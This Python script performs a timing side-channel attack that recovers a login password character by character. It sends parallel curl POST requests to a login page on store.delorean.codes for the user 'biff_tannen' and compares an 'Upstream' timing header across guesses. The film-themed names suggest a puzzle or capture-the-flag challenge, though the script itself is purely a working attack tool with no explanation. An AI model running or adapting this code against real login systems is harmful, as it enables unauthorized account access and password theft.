#!/usr/bin/env python
# pylint:disable=missing-docstring,invalid-name

import multiprocessing
import subprocess
import urllib


def get_time(pwd):
    url = 'https://store.delorean.codes/u/MathSquared/login'

    query = urllib.urlencode({
        'username': 'biff_tannen',
        'password': pwd,
    })

    cmd = ['curl']
    #cmd.extend(['-o', '/dev/null'])  # bitbucket
    cmd.extend(['-i'])  # response headers
    cmd.extend(['-X', 'POST'])  # method
    cmd.extend(['-H', 'Content-Type: application/x-www-form-urlencoded'])
    cmd.extend(['-d', query, url])

    pipe = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, _ = pipe.communicate()

    return [x.split()[1] for x in out.splitlines() if 'Upstream' in x]


def main():
    ls = list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')

    pwd = ''
    while True:
        realpwd = (pwd + '%s' if len(pwd) >= 5 else pwd + '%s' + 'a' * (5 - len(pwd)))
        p = multiprocessing.Pool(62)
        arr = p.map(get_time, [realpwd % ch for ch in ls])
        idxa = [i for i, time in enumerate(arr) if time != arr[0]]
        idx = 0 if len(idxa) > 1 else idxa[0]
        pwd += ls[idx]
        print pwd

        if arr[idx] == []: return  # done

if __name__ == '__main__':
    main()
